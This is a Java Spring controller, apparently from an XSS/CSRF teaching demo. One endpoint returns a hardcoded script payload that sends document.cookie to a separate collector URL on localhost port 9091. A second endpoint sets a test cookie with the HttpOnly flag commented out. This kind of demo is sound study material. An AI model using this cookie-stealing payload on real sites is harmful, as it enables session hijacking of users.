package com.xy.csrf和xss攻击;

import org.springframework.boot.web.servlet.server.Session;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/**
 * @fileName:DiscussController
 * @author:xy
 * @date:2020/4/8
 * @description:
 */
@Controller
public class DiscussController {

    @RequestMapping("/message")
    @ResponseBody
    public String message() {
        //模拟用户输入一份脚本
        String msg = "<script>\n" +
                "    window.open('http://127.0.0.1:9091/xss?msg='+document.cookie)\n" +
                "</script>";
//        String msg="<script>alert()</script>";
        return msg;
    }
    @GetMapping("/index2")
    @SuppressWarnings("all")
    public String index2(HttpServletResponse response){
        //没有cookie 我就自己写一个吧
        Cookie cookie = new Cookie("name_test","value_test");//创建新cookie
        cookie.setMaxAge(5 * 60);// 设置存在时间为5分钟
//        cookie.setPath("/");//设置作用域
//        cookie.setHttpOnly(true);
        response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
        return "discuss";
    }
}
